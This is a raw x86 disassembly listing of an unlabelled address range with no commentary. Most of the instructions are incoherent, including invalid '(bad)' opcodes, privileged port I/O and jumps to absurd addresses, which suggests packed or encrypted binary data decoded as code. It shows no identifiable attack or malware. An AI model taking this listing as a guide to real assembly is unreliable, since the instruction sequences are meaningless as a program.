  413ca1:	or     DWORD PTR [ecx],ebp
  413ca3:	jo     0x413d0c
  413ca5:	in     eax,dx
  413ca6:	jecxz  0x413cce
  413ca8:	or     BYTE PTR [ebp-0x7e],ch
  413cab:	shl    BYTE PTR [ebx+0x6f],1
  413cae:	sub    DWORD PTR [eax],ebp
  413cb0:	aad    0xc3
  413cb2:	or     al,0x3d
  413cb4:	fcomp  QWORD PTR [ebp-0x28ca8ee5]
  413cba:	(bad)  
  413cbb:	retf   0xac16
  413cbe:	ins    DWORD PTR es:[edi],dx
  413cbf:	pusha  
  413cc0:	iret   
  413cc1:	xchg   edx,eax
  413cc2:	or     ebx,0x3c3ac75e
  413cc8:	std    
  413cc9:	loop   0x413d09
  413ccb:	sbb    bl,dh
  413ccd:	jg     0x413d4e
  413ccf:	shr    edi,1
  413cd1:	jl     0x413cbc
  413cd3:	retf   0x364c
  413cd6:	rcl    ebp,cl
  413cd8:	mov    eax,ds:0x1eba9fab
  413cdd:	int    0x95
  413cdf:	sub    dh,0xf2
  413ce2:	mov    esi,0x82149716
  413ce7:	ss cmp eax,0xd31a8fd7
  413ced:	cmp    eax,0x82c958b1
  413cf2:	out    0xd4,eax
  413cf4:	cmp    BYTE PTR [esi+0x11],ch
  413cf7:	push   eax
  413cf8:	inc    edx
  413cf9:	mov    cl,0x28
  413cfb:	mov    bh,BYTE PTR [edi]
  413cfd:	fnstcw WORD PTR [ebp+0x33]
  413d00:	sub    DWORD PTR [esi],edi
  413d02:	inc    dl
  413d04:	mov    esi,0x457a0341
  413d09:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  413d0a:	push   ss
  413d0b:	mov    cl,0xda
  413d0d:	xor    al,BYTE PTR [ebp+0xe]
  413d10:	nop
  413d11:	push   edi
  413d12:	and    DWORD PTR [edx],0x13aed30d
  413d18:	in     al,dx
  413d19:	sahf   
  413d1a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  413d1b:	aad    0x20
  413d1d:	inc    edx
  413d1e:	sub    al,0xbb
  413d20:	lock repz es push esp
  413d24:	dec    esi
  413d25:	das    
  413d26:	xor    BYTE PTR [ecx],bh
  413d28:	imul   edi,edx,0x9a7ac7ee
  413d2e:	test   ebp,esp
  413d30:	loop   0x413cc0
  413d32:	iret   
  413d33:	mov    dl,0x17
  413d35:	push   esi
  413d36:	jns    0x413d71
  413d38:	xchg   DWORD PTR [eax-0x4e431283],ecx
  413d3e:	jns    0x413cfe
  413d40:	ja     0x413d5d
  413d42:	nop
  413d43:	stos   DWORD PTR es:[edi],eax
  413d44:	imul   esi,ebx,0x77
  413d47:	cs ret 0x67d0
  413d4b:	loopne 0x413cde
  413d4d:	int3   
  413d4e:	push   0x33
  413d50:	lea    eax,[edi-0xe28d5d2]
  413d56:	sbb    edx,esi
  413d58:	mov    bl,0x91
  413d5a:	mov    edx,0x3de93bbc
  413d5f:	mov    bl,0xdb
  413d61:	in     al,dx
  413d62:	add    BYTE PTR [edi-0x57e8a34b],0xdb
  413d69:	(bad)  
  413d6a:	jb     0x413dea
  413d6c:	nop
  413d6d:	clc    
  413d6e:	jge    0x413dec
  413d70:	or     al,0x72
  413d72:	inc    edi
  413d73:	aaa    
  413d74:	sub    al,0x32
  413d76:	aad    0xdc
  413d78:	dec    ebx
  413d79:	iret   
  413d7a:	lea    edi,[edi+0x47]
  413d7d:	sbb    al,0x65
  413d7f:	cmp    DWORD PTR [ebx+eax*8-0x7f],edx
  413d83:	mov    eax,ds:0xe27c8c9d
  413d88:	test   DWORD PTR [ecx*2-0x1ee89f24],ebp
  413d8f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  413d90:	fst    QWORD PTR [ebp+0x5e]
  413d93:	enter  0x9040,0x5a
  413d97:	fwait
  413d98:	int    0x94
  413d9a:	rol    BYTE PTR [eax+edi*4],0x1d
  413d9e:	xor    eax,0x83d44712
  413da3:	mov    eax,ds:0xd9d0f844
  413da8:	icebp  
  413da9:	mov    al,ds:0xb0953b95
  413dae:	stc    
  413daf:	iret   
  413db0:	adc    esi,edi
  413db2:	add    cl,bl
  413db4:	ret    
  413db5:	or     BYTE PTR [ebp-0x2d],0x9b
  413db9:	and    BYTE PTR [esi+0x1f4b3a2a],dl
  413dbf:	mov    dh,0x20
  413dc1:	ins    DWORD PTR es:[edi],dx
  413dc2:	test   DWORD PTR [ebx],ebx
  413dc4:	push   0xbf36adc8
  413dc9:	add    BYTE PTR [ebp+0x51480e2b],cl
  413dcf:	int3   
  413dd0:	cli    
  413dd1:	cmp    DWORD PTR [eax],0x6828ce4b
  413dd7:	shl    edx,1
  413dd9:	sar    BYTE PTR [esp+eax*8-0x40],1
  413ddd:	mov    ds:0xff71f04c,eax
  413de2:	jecxz  0x413e48
  413de4:	sar    dl,0x27
  413de7:	in     al,0x34
  413de9:	mov    ?,WORD PTR [edi+0x57e3bb83]
  413def:	cmp    ebx,DWORD PTR [ecx]
  413df1:	fsubrp st(5),st
  413df3:	jmp    0x3b591e11
  413df8:	dec    esi
  413df9:	imul   esi,edi,0x305e00a1
  413dff:	por    mm5,QWORD PTR [eax]
  413e02:	push   es
  413e03:	repnz fidivr DWORD PTR [edx-0x15151a02]
  413e0a:	add    al,0x12
  413e0c:	pop    esi
  413e0d:	aas    
  413e0e:	rol    ebx,0xae
  413e11:	bound  ebx,QWORD PTR [esi+edi*2]
  413e14:	fdiv   DWORD PTR [edi+0x42]
  413e17:	adc    DWORD PTR [ebx-0x80],0xe0e1e2a0
  413e1e:	imul   edi,DWORD PTR [ecx+0x71],0xe8be9d5
  413e25:	mov    ch,0xfc
  413e27:	setb   cl
  413e2a:	in     al,0xbe
  413e2c:	pop    edx
  413e2d:	(bad)  
  413e2e:	fstp   QWORD PTR [edi+0x2b]
  413e31:	jae    0x413dbf
  413e33:	xchg   edi,eax
  413e34:	ror    BYTE PTR [ebx-0x64],0x68
  413e38:	mov    WORD PTR [ebp+0x56e2bbba],?
  413e3e:	xor    dh,bl
  413e40:	ret    0xb012
  413e43:	lods   al,BYTE PTR ds:[esi]
  413e44:	or     edx,DWORD PTR [ebx+0x2]
  413e47:	lods   eax,DWORD PTR ds:[esi]
  413e48:	push   0xfffffffe
  413e4a:	and    eax,0x17564a24
  413e4f:	imul   ebx,DWORD PTR [ecx-0x79],0x950435b2
  413e56:	in     eax,0xeb
  413e58:	loop   0x413e27
  413e5a:	mov    eax,ds:0x6967a527
  413e5f:	mov    bh,0x45
  413e61:	mov    bh,BYTE PTR ds:0x3c19dd4c
  413e67:	mov    BYTE PTR [esi],0xf1
  413e6a:	int    0x25
  413e6c:	add    BYTE PTR [ebp+0x692cc116],ch
  413e72:	jl     0x413e4b
  413e74:	in     eax,0x27
  413e76:	icebp  
  413e77:	stc    
  413e78:	and    eax,0xddfa999d
  413e7d:	or     bh,BYTE PTR [ebx+0x6062e88]
  413e83:	mov    eax,0xc9cde7fb
  413e88:	pop    esp
  413e89:	enter  0xf742,0xaf
  413e8d:	dec    eax
  413e8e:	cmp    eax,0xa686ec29
  413e93:	jl     0x413f09
  413e95:	sub    ebx,eax
  413e97:	out    dx,eax
  413e98:	add    ebx,DWORD PTR [edi+0x513da47d]
  413e9e:	daa    
  413e9f:	and    DWORD PTR [edi],ecx
  413ea1:	scas   eax,DWORD PTR es:[edi]
  413ea2:	sti    
  413ea3:	mov    ebx,DWORD PTR [ebp-0x18]
  413ea6:	jmp    0x41412e
  413eab:	rol    bh,cl
  413ead:	leave  
  413eae:	rcr    ecx,1
  413eb0:	rcr    edx,1
  413eb2:	(bad)  
  413eb3:	enter  0x3d11,0x8f
  413eb7:	ret    
  413eb8:	into   
  413eb9:	sbb    al,0x13
  413ebb:	out    dx,eax
  413ebc:	push   es
  413ebd:	jg     0x413f37
  413ebf:	in     eax,0x7e
  413ec1:	js     0x413f3b
  413ec3:	test   BYTE PTR es:[ecx+0x58ed3225],al
  413eca:	xor    al,0x3d
  413ecc:	jge    0x413ee6
  413ece:	cmp    bh,BYTE PTR [esi-0xff6fc82]
  413ed4:	(bad)  
  413ed5:	mov    ah,0x50
  413ed7:	(bad)  
  413ed8:	sbb    BYTE PTR [ecx+edx*4-0x355ce1b],0xa3
  413ee0:	std    
  413ee1:	test   BYTE PTR [edi-0x1c3b9337],dh
  413ee7:	pop    esi
  413ee8:	inc    edx
  413ee9:	mov    ds:0xae4f1db9,al
  413eee:	jno    0x413e86
  413ef0:	sar    DWORD PTR [ebx-0x39175592],1
  413ef6:	aad    0x85
  413ef8:	je     0x413ecc
  413efa:	inc    edi
  413efb:	std    
  413efc:	push   eax
  413efd:	cmp    ch,bh
  413eff:	ins    DWORD PTR es:[edi],dx
  413f00:	out    0x4,al
  413f02:	sub    DWORD PTR [esi+edx*2-0x7d4e6550],esp
  413f09:	add    DWORD PTR [ebp+0x26],eax
  413f0c:	int3   
  413f0d:	sub    al,BYTE PTR [ecx]
  413f0f:	cld    
  413f10:	jne    0x413f3d
  413f12:	adc    al,0xe7
  413f14:	mov    edi,0x87f22631
  413f19:	pop    esi
  413f1a:	xor    eax,0xea9ddc2
  413f1f:	mov    bh,0x7f
  413f21:	or     BYTE PTR [eax+0x1e55f4e8],bh
  413f27:	jo     0x413ef3
  413f29:	pop    ebx
  413f2a:	ss call 0x8c674b0e
  413f30:	scas   eax,DWORD PTR es:[edi]
  413f31:	inc    edx
  413f32:	add    BYTE PTR [ebx+0x325f5545],bh
  413f38:	push   ebp
  413f39:	add    eax,0x695af7e8
  413f3e:	sbb    esp,DWORD PTR [edi+eiz*2-0x27300530]
  413f45:	fucomp st(3)
  413f47:	adc    al,BYTE PTR [ebx+0x46cbbf09]
  413f4d:	mov    ch,0x72
  413f4f:	(bad)
  413f52:	sub    dl,dl
  413f54:	inc    edx
  413f55:	push   0xffffffff
  413f57:	pop    ds
  413f58:	mov    ebx,0x8e2f5f5a
  413f5d:	mov    BYTE PTR cs:[edx],cl
  413f60:	cmp    eax,0xe137862
  413f65:	inc    eax
  413f66:	push   esi
  413f67:	dec    ebp
  413f68:	icebp  
  413f69:	adc    eax,0xb537ec8d
  413f6e:	mov    esp,DWORD PTR [edx+0x7a]
  413f71:	or     DWORD PTR [eax+0x42],ebx
  413f74:	das    
  413f75:	inc    esp
  413f76:	adc    DWORD PTR [esi-0x6e374955],eax
  413f7c:	leave  
  413f7d:	xor    al,0x6a
  413f7f:	cmc    
  413f80:	sub    edi,DWORD PTR [eax]
  413f82:	aad    0xf5
  413f84:	out    dx,eax
  413f85:	xor    BYTE PTR [ebp-0x8ffa934],bl
  413f8b:	push   0x15d72a11
  413f90:	in     eax,0x99
  413f92:	in     al,dx
  413f93:	push   ss
  413f94:	adc    al,0xb1
  413f96:	push   0xec3e5302
  413f9b:	push   ds
  413f9c:	inc    edi
  413f9d:	add    BYTE PTR [eax+0x5b],ch
  413fa0:	arpl   WORD PTR [ebx+ebx*1+0x37ce7c60],ax
  413fa7:	sbb    eax,DWORD PTR [edi-0x23]
  413faa:	xchg   edx,eax
  413fab:	(bad)  
  413fac:	out    0x53,al
  413fae:	fild   QWORD PTR [ebx+0x62]
  413fb1:	sbb    ah,BYTE PTR [esi-0x2a4f410a]
  413fb7:	push   ebx
  413fb8:	pop    ebx
  413fb9:	mov    ebp,0x25ad0501
  413fbe:	lahf   
  413fbf:	or     eax,0xf632cf3a
  413fc4:	les    ebp,FWORD PTR [eax+ebp*2]
  413fc7:	in     al,0xfd
  413fc9:	sbb    edx,DWORD PTR [eax-0xb95c7e1]
  413fcf:	mov    dl,0x32
  413fd1:	xor    BYTE PTR [ecx],0xe7
  413fd4:	push   es
  413fd5:	sbb    al,0x6d
  413fd7:	or     al,0x77
  413fd9:	or     al,dl
  413fdb:	lds    esp,FWORD PTR [ecx-0x53499b25]
  413fe1:	popf   
  413fe2:	pop    ecx
  413fe3:	mov    WORD PTR [ebx-0x66],es
  413fe6:	add    al,0x44
  413fe8:	lahf   
  413fe9:	cli    
  413fea:	pop    edx
  413feb:	pop    edi
  413fec:	ret    0x1f48
  413fef:	hlt    
  413ff0:	ja     0x413fed
  413ff2:	in     al,0x68
  413ff4:	cmp    BYTE PTR [eax],ah
  413ff6:	scas   eax,DWORD PTR es:[edi]
  413ff7:	cmp    DWORD PTR [ebx+0x3b],eax
  413ffa:	mov    dh,0xbf
  413ffc:	nop
  413ffd:	and    al,0x26
  413fff:	repz xchg al,ch
  414002:	sbb    ebx,DWORD PTR [esi+0x6636aaf5]
  414008:	aaa    
  414009:	jge    0x413f8c
  41400b:	outs   dx,DWORD PTR ds:[esi]
  41400c:	sub    ebx,DWORD PTR [edi]
  41400e:	sbb    al,0xb7
  414010:	cmp    BYTE PTR [ebp+0x8414f1d],ch
  414016:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  414017:	sub    eax,0xceae7cb4
  41401c:	stc    
  41401d:	and    eax,0x8b8cf7a5
  414022:	or     eax,0xbf59635d
  414027:	sub    eax,esp
  414029:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41402a:	add    ebp,DWORD PTR [edx+eiz*8+0x33]
  41402e:	hlt    
  41402f:	loop   0x41405f
  414031:	add    bl,BYTE PTR [eax]
  414033:	lock mov bh,0xb9
  414036:	shl    BYTE PTR [eax],cl
  414038:	out    0x64,eax
  41403a:	daa    
  41403b:	cmp    al,bl
  41403d:	jbe    0x413fe4
  41403f:	ret    0xe0e0
  414042:	icebp  
  414043:	cs fwait
  414045:	lock aas 
  414047:	pop    ds
  414048:	dec    ebp
  414049:	rol    BYTE PTR ds:0x452b8d18,0xfd
  414050:	adc    esi,esp
  414052:	mov    BYTE PTR [esi+0x6c29823a],cl
  414058:	cmp    dh,BYTE PTR [ebp+0x19d95bd0]
  41405e:	pusha  
  41405f:	leave  
  414060:	loope  0x41407e
  414062:	adc    eax,0xd47519a7
  414067:	mov    bl,0x78
  414069:	ins    BYTE PTR es:[edi],dx
  41406a:	jb     0x414029
  41406c:	jg     0x414011
  41406e:	stc    
  41406f:	(bad)  
  414070:	imul   edi,edx,0xfffffff8
  414073:	xor    DWORD PTR [ebx],0xffffff99
  414076:	int    0x10
  414078:	fld1   
  41407a:	sbb    ch,dh
  41407c:	jge    0x41403a
  41407e:	xchg   edi,eax
  41407f:	jo     0x4140ef
  414081:	inc    edx
  414082:	push   ebx
  414083:	in     eax,dx
  414084:	enter  0x7324,0x8a
  414088:	mov    esi,ecx
  41408a:	and    eax,0x79b16511
  41408f:	mov    ch,0xc3
  414091:	sar    DWORD PTR ds:0xb814d1ba,0xf0
  414098:	fsub   st,st(7)
  41409a:	inc    eax
  41409b:	dec    edx
  41409c:	mov    ebx,0x95a3c935
  4140a1:	(bad)  
  4140a2:	loope  0x414031
  4140a4:	jle    0x4140fc
  4140a6:	mov    ecx,0xa33bb222
  4140ab:	mov    dh,0xb2
  4140ad:	cli    
  4140ae:	ror    DWORD PTR [ebp-0x22],1
  4140b1:	out    dx,eax
  4140b2:	and    DWORD PTR ds:0xdeeb2bb0,edx
  4140b8:	sub    BYTE PTR [eax],ah
  4140ba:	pop    ecx
  4140bb:	into   
  4140bc:	inc    edx
  4140bd:	add    ebx,eax
  4140bf:	or     eax,0x9311e0d4
  4140c4:	jecxz  0x414078
  4140c6:	loop   0x414147
  4140c8:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4140c9:	adc    BYTE PTR [eax+eax*4],dh
  4140cc:	sub    al,0x88
  4140ce:	imul   edi,DWORD PTR [ebx],0x49702b16
  4140d4:	mov    al,BYTE PTR [eax+0x1f477820]
  4140da:	mov    esi,0x211a6490
  4140df:	aad    0xa
  4140e1:	or     eax,0xc873f058
  4140e6:	dec    ecx
  4140e7:	fcom   DWORD PTR ds:0x37f15275
  4140ed:	es jg  0x4140d9
  4140f0:	fdivrp st(7),st
  4140f2:	lock or edx,esi
  4140f5:	repnz adc al,0xac
  4140f8:	mov    esi,0x87c8731b
  4140fd:	in     al,0xfc
  4140ff:	add    al,0x7
  414101:	mov    dl,bh
  414103:	jp     0x41411d
  414105:	mov    cl,0xf7
  414107:	add    DWORD PTR [ecx-0x26],eax
  41410a:	push   esi
  41410b:	xor    BYTE PTR [edi-0x3b99bf22],0xd3
  414112:	ret    0x7e06
  414115:	mov    al,0xe1
  414117:	(bad)  
  414118:	jmp    0xd36ff21
  41411d:	mov    ecx,0xb6d22116
  414122:	push   edi
  414123:	stos   DWORD PTR es:[edi],eax
  414124:	retf   
  414125:	call   0x5fe5f4f3
  41412a:	lods   al,BYTE PTR ds:[esi]
  41412b:	and    ebx,DWORD PTR [esi]
  41412d:	ja     0x414162
  41412f:	fsubr  st,st(1)
  414131:	add    DWORD PTR [edx],0x0
  414134:	add    ah,al
  414136:	aas    
  414137:	int    0xc9
  414139:	(bad)  
  41413b:	aam    0x3d
  41413d:	mov    eax,ds:0x62145a14
  414142:	nop
  414143:	loope  0x4140df
  414145:	push   esp
  414146:	add    al,0x7f
  414148:	js     0x41412f
  41414a:	jle    0x4141c4
  41414c:	js     0x4140fa
  41414e:	xlat   BYTE PTR ds:[ebx]
  41414f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  414150:	div    DWORD PTR es:[edx-0x4f]
  414154:	scas   eax,DWORD PTR es:[edi]
  414155:	sbb    ch,BYTE PTR [ebx]
  414157:	dec    eax
  414158:	(bad)  
  414159:	out    dx,al
  41415a:	pop    ds
  41415b:	repz jnp 0x4141b4
  41415e:	call   0x6662579d
  414163:	test   esp,0x179817d1
  414169:	mov    al,0xb6
  41416b:	cld    
  41416c:	adc    BYTE PTR [esi-0x3df281c8],dh
  414172:	xor    esi,DWORD PTR ds:0xe343a6b
  414178:	inc    eax
  414179:	push   0xfffffff0
  41417b:	or     cl,bl
  41417d:	lods   al,BYTE PTR ds:[esi]
  41417e:	icebp  
  41417f:	mov    WORD PTR [ebp+eax*8-0x7440d6f0],?
  414186:	div    BYTE PTR [eax+ebp*1-0x68]
  41418a:	ror    DWORD PTR [edx+ebx*2-0x3c],cl
  41418e:	or     ecx,esi
  414190:	jecxz  0x414210
  414192:	jbe    0x4141a0
  414194:	iret   
  414195:	fidiv  WORD PTR [eax]
  414197:	scas   eax,DWORD PTR es:[edi]
  414198:	jg     0x4141c1
  41419a:	add    esp,DWORD PTR [eax-0x7c6d6a8f]
  4141a0:	lock les ecx,FWORD PTR [ebp-0x51982a8d]
  4141a7:	ins    DWORD PTR es:[edi],dx
  4141a8:	cdq    
  4141a9:	cld    
  4141aa:	jecxz  0x41420e
  4141ac:	pop    ebp
  4141ad:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4141ae:	push   esp
  4141af:	pop    esp
  4141b0:	xchg   edx,eax
  4141b1:	jno    0x4141b7
  4141b3:	xlat   BYTE PTR ds:[ebx]
  4141b4:	jecxz  0x414146
  4141b6:	stc    
  4141b7:	in     al,dx
  4141b8:	jl     0x4141e4
  4141ba:	xchg   ebx,eax
  4141bb:	pusha  
  4141bc:	xchg   ebp,eax
  4141bd:	inc    edi
  4141be:	pop    es
  4141bf:	xlat   BYTE PTR ds:[ebx]
  4141c0:	add    al,0x46
  4141c2:	fs pop ebp
  4141c4:	iret   
  4141c5:	jb     0x4141c5
  4141c7:	test   BYTE PTR [ecx+0x4d2bf0f8],ch
  4141cd:	mov    ebx,0xefb29156
  4141d2:	cmc    
  4141d3:	sub    al,0x25
  4141d5:	pusha  
  4141d6:	add    ch,bl
  4141d8:	rol    BYTE PTR [eax],1
  4141da:	int    0x8e
  4141dc:	call   0x3c08:0xf87b571f
  4141e3:	rcl    ecx,1
  4141e5:	add    BYTE PTR cs:[edx+0x47c52e27],bh
  4141ec:	or     BYTE PTR [ebp+0x41d21f9f],cl
  4141f2:	mov    dl,0xef
  4141f4:	inc    edi
  4141f5:	cmp    bl,BYTE PTR [eax+0x316b87fd]
  4141fb:	or     DWORD PTR [edx+0x400cda00],eax
  414201:	or     eax,0x9f138ed
  414206:	data16 cmp BYTE PTR [ecx],ah
  414209:	adc    eax,0xf390f16e
  41420e:	imul   edx,DWORD PTR [edx+0x39be7e82],0x22
  414215:	or     al,bh
  414217:	cli    
  414218:	mov    edi,esi
  41421a:	mov    dh,0xeb
  41421c:	jmp    0xb42f60cf
  414221:	cmp    eax,0x60c0a69e
  414226:	popa   
  414227:	leave  
  414228:	mov    WORD PTR [esi+0x178ef2ca],ss
  41422e:	sar    ebx,cl
  414230:	ins    BYTE PTR es:[edi],dx
  414231:	inc    edx
  414232:	adc    al,0x7a
  414234:	sub    edx,DWORD PTR [edi-0x20]
  414237:	(bad)  
  414238:	xchg   ecx,eax
  414239:	lahf   
  41423a:	fld    QWORD PTR [ebp+0x32]
  41423d:	push   ebx
  41423e:	xchg   edx,eax
  41423f:	mov    al,0xc7
  414241:	and    ebx,DWORD PTR [edi-0x4853fb53]
  414247:	popa   
  414248:	dec    ebx
  414249:	mov    ecx,0xef07aa2c
  41424e:	sub    al,0x35
  414250:	iret   
  414251:	test   BYTE PTR [ebx*2+0x7ca1613a],al
  414258:	adc    al,BYTE PTR [edx]
  41425a:	fidivr WORD PTR [edi-0x5]
  41425d:	scas   al,BYTE PTR es:[edi]
  41425e:	call   0x79cd:0x254c47fb
  414265:	loopne 0x41426a
  414267:	call   0x191f70
  41426c:	movs   DWORD PTR es:[edi],DWORD PTR cs:[esi]
  41426e:	xchg   ebx,eax
  41426f:	jbe    0x41423f
  414271:	mov    edx,0xbb3b8c
  414276:	or     DWORD PTR [edi+0x11446912],ebp
  41427c:	xor    ebx,DWORD PTR [edx]
  41427e:	mov    cl,BYTE PTR [ebp+0x2f20156c]
  414284:	jne    0x4142f9
  414286:	in     al,0x94
  414288:	xor    eax,0x8fdd1385
  41428d:	ins    DWORD PTR es:[edi],dx
  41428e:	fnstenv [edx-0x3a65a5fe]
  414294:	push   edi
  414295:	addr16 mov dh,0x3d
  414298:	xchg   ecx,eax
  414299:	call   0x9ac:0x4c7bdbba
  4142a0:	xor    esp,DWORD PTR ds:0x1eed781b
  4142a6:	or     edx,0x7b
  4142a9:	sbb    dh,BYTE PTR [ebx-0x3c]
  4142ac:	pop    es
  4142ad:	cs fmul st(0),st
  4142b0:	aad    0xbf
  4142b2:	retf   0xdd77
  4142b5:	sub    esi,DWORD PTR [edx-0x7e]
  4142b8:	fiadd  WORD PTR [edi+0x36b157f0]
  4142be:	xor    BYTE PTR [edx+0x17],bh
  4142c1:	cs addr16 push ecx
  4142c4:	jae    0x4142b3
  4142c6:	std    
  4142c7:	mov    fs,WORD PTR [esi+0x5de0a660]
  4142cd:	hlt    
  4142ce:	pop    edi
  4142cf:	pop    es
  4142d0:	mov    DWORD PTR [ecx-0x70],esi
  4142d3:	and    eax,0xe2d0540e
  4142d8:	sbb    DWORD PTR [eax-0x27],esp
  4142db:	clc    
  4142dc:	and    DWORD PTR [esi+ebp*1-0x4f14d52],esp
  4142e3:	push   0xffffff96
  4142e5:	sub    BYTE PTR [ebx-0x4eb6d805],cl
  4142eb:	test   al,0x7c
  4142ed:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4142ee:	mov    ebp,0xb29f4e2a
  4142f3:	call   0xc2a3e61a
  4142f8:	imul   ecx,DWORD PTR [edi+ecx*8-0x5ef8a01a],0x4a
  414300:	mov    bl,0xd9
  414302:	jle    0x41434a
  414304:	mov    ebx,0x8d9dd4be
  414309:	call   0x45f6:0x644896a5
  414310:	outs   dx,DWORD PTR ds:[esi]
  414311:	adc    al,BYTE PTR [ebp-0x5c12e1d6]
  414317:	int3   
  414318:	popa   
  414319:	sub    eax,0x8b032efd
  41431e:	inc    ecx
  41431f:	scas   eax,DWORD PTR es:[edi]
  414320:	mov    edi,DWORD PTR [ebp+0x49199109]
  414326:	or     DWORD PTR [ecx-0x3d2f8142],edi
  41432c:	fcomp  DWORD PTR es:[ecx+0x504ab61a]
  414333:	jle    0x41432c
  414335:	pop    es
  414336:	add    DWORD PTR [eax],eax
  414338:	jo     0x414356
  41433a:	mov    al,0x16
  41433c:	out    0xf7,al
  41433e:	pop    esp
  41433f:	pop    DWORD PTR [ebp+0x3d]
  414342:	sbb    eax,0xb191b6c4
  414347:	and    DWORD PTR [esi],edx
  414349:	ins    DWORD PTR es:[edi],dx
  41434a:	pop    eax
  41434b:	pop    es
  41434c:	fwait
  41434d:	es es jg 0x414338
  414351:	push   ss
  414352:	inc    ecx
  414353:	(bad)  
  414354:	mov    BYTE PTR [eax-0x42],0xfd
  414358:	xor    ebx,DWORD PTR [edx+ecx*4-0x5d]
  41435c:	das    
  41435d:	in     al,0x6a
  41435f:	mov    esp,0xd012c469
  414364:	xor    al,0x41
  414366:	adc    BYTE PTR [eax+0x3c],bl
  414369:	sbb    edi,DWORD PTR [eax]
  41436b:	dec    esi
  41436c:	shl    DWORD PTR [edi-0x6c058896],cl
  414372:	imul   edi,ecx,0xb8d655e5
  414378:	and    edi,esp
  41437a:	outs   dx,DWORD PTR ds:[esi]
  41437b:	call   0xcd6c:0xce58c9bf
  414382:	jbe    0x4143a8
  414384:	aas    
  414385:	aam    0xa1
  414387:	dec    edx
  414388:	jo     0x4143c8
  41438a:	xchg   ebx,eax
  41438b:	pop    ds
  41438c:	jmp    0x1ab98dd2
  414391:	xchg   DWORD PTR [ebx-0x2fd785fa],eax
  414397:	sbb    bh,dh
  414399:	mov    DWORD PTR [esi-0x2bf3a134],ebp
  41439f:	(bad)  
  4143a0:	cmp    al,0x5a
  4143a2:	imul   eax,DWORD PTR [ebx],0x2affe0db
  4143a8:	outs   dx,BYTE PTR ds:[esi]
  4143a9:	pop    es
  4143aa:	adc    BYTE PTR [ebx],ch
  4143ac:	icebp  
  4143ad:	adc    al,dl
  4143af:	add    eax,0x3ad635aa
  4143b4:	mov    al,ds:0x2b431f59
  4143b9:	ror    DWORD PTR [ebp+0x72981fbc],1
  4143bf:	xor    al,BYTE PTR [eax]
  4143c1:	cmp    edi,edx
  4143c3:	jbe    0x4129d7
  4143c9:	mov    edx,DWORD PTR [ebp-0xc]
  4143cc:	mov    edi,DWORD PTR [ebp-0x24]
  4143cf:	xor    edx,eax
  4143d1:	add    edx,ecx
  4143d3:	jmp    0x41465b
  4143d8:	(bad)
  4143db:	rcr    bl,1
  4143dd:	fcmovb st,st(5)
  4143df:	rol    DWORD PTR [ebx-0x7f],1
  4143e2:	add    ecx,ebp
  4143e4:	xchg   ecx,eax
  4143e5:	ins    BYTE PTR es:[edi],dx
  4143e6:	(bad)  
  4143e7:	fadd   st,st(1)
  4143e9:	or     DWORD PTR [edi+0x78],edi
  4143ec:	in     eax,0x7e
  4143ee:	js     0x414468
  4143f0:	adc    edi,DWORD PTR [ecx-0x53]
  4143f3:	push   0xffffffaa
  4143f5:	fs in  eax,dx
  4143f7:	sbb    edi,ebp
  4143f9:	adc    BYTE PTR [edx+ebp*2],ch
  4143fc:	das    
  4143fd:	push   edi
  4143fe:	jo     0x414460
  414400:	and    edx,edi
  414402:	and    bh,BYTE PTR [ecx-0x33]
  414405:	dec    esp
  414406:	pop    ecx
  414407:	loop   0x414475
  414409:	int    0xac
  41440b:	inc    ecx
  41440c:	pop    edx
  41440d:	mov    WORD PTR [esi],fs
  41440f:	jo     0x4143e7
  414411:	lahf   
  414412:	in     al,0x3f
  414414:	and    DWORD PTR [eax+0x3ce39e48],eax
  41441a:	faddp  st(4),st
  41441c:	ffreep st(0)
  41441e:	leave  
  41441f:	aaa    
  414420:	jmp    0x41447e
  414422:	mul    BYTE PTR [edx]
  414424:	mov    DWORD PTR [eax-0xd],ebx
  414427:	loop   0x414424
  414429:	repz call 0x25028df8
  41442f:	and    dl,BYTE PTR [esi+ebx*8-0x5890c2a3]
  414436:	shl    DWORD PTR [ecx],1
  414438:	dec    esp
  414439:	fimul  DWORD PTR [ecx]
  41443b:	pop    edx
  41443c:	(bad)  
  41443d:	sbb    eax,0xf94ef99b
  414442:	cmp    BYTE PTR [ebx],cl
  414444:	jno    0x4144a3
  414446:	enter  0x52f6,0xe6
  41444a:	mov    esp,0x9b0195bc
  41444f:	aad    0x48
  414451:	jl     0x4144bf
  414453:	je     0x4143dc
  414455:	test   BYTE PTR [eax-0x27],0xb4
  414459:	or     esp,DWORD PTR [ebp-0x4a]
  41445c:	mov    al,0x43
  41445e:	ins    BYTE PTR es:[edi],dx
  41445f:	add    al,0x91
  414461:	out    dx,al
  414462:	jp     0x4144d2
  414464:	shr    BYTE PTR [ebp-0x2b91aa52],0x10
  41446b:	push   0xffffffd7
  41446d:	outs   dx,DWORD PTR ds:[esi]
  41446e:	sbb    BYTE PTR [eax],al
  414470:	cmp    ebp,edx
  414472:	jbe    0x414407
  414474:	pop    esp
  414475:	jno    0x41446e
  414477:	inc    ecx
  414478:	out    0x44,al
  41447a:	or     DWORD PTR [esi],0x14
  41447d:	aaa    
  41447e:	leave  
  41447f:	mov    esi,0xb57b14ee
  414484:	xchg   BYTE PTR [ebx-0x1767fc60],bh
  41448a:	loop   0x4144af
  41448c:	sbb    eax,0x859fa650
  414491:	lock add al,0xb8
  414494:	sub    BYTE PTR [ebp+0x2e66b0f2],0xd7
  41449b:	popf   
  41449c:	mov    cl,0xa9
  41449e:	jmp    0x3a07e4d
  4144a3:	lock mov esp,0x231c45dd
  4144a9:	ret    0xbd06
  4144ac:	or     BYTE PTR [ebx-0x2175f539],0xc5
  4144b3:	ins    DWORD PTR es:[edi],dx
  4144b4:	push   ebp
  4144b5:	sbb    ah,bl
  4144b7:	lods   eax,DWORD PTR ds:[esi]
  4144b8:	arpl   WORD PTR [edi+edx*2-0x3d],si
  4144bc:	aad    0x67
  4144be:	or     ecx,DWORD PTR ds:[edx-0x63bb5750]
  4144c5:	arpl   WORD PTR [edx+0xd10fef9],cx
